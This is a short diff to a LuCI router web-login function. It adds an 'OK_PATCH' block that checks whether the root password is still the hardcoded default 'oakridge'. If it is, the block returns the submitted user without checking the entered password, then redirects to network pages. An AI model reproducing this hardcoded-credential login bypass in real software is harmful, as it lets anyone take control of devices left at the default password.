@@ -109,6 +109,17 @@ function authenticator.htmlauth(validator, accs, default, template)
 		return user
 	end
 
+    -- OK_PATCH
+    if validator("root", "oakridge") then
+        if luci.system.net.pingtest("8.8.8.8") ~= 0 then
+            luci.http.redirect(luci.dispatcher.build_url('admin/network/diagnostics'))
+        else
+            luci.http.redirect(luci.dispatcher.build_url('admin/network/network'))
+        end
+        return user
+    end
+    -- end of OK_PATCH
+
 	require("luci.i18n")
 	require("luci.template")
 	context.path = {}
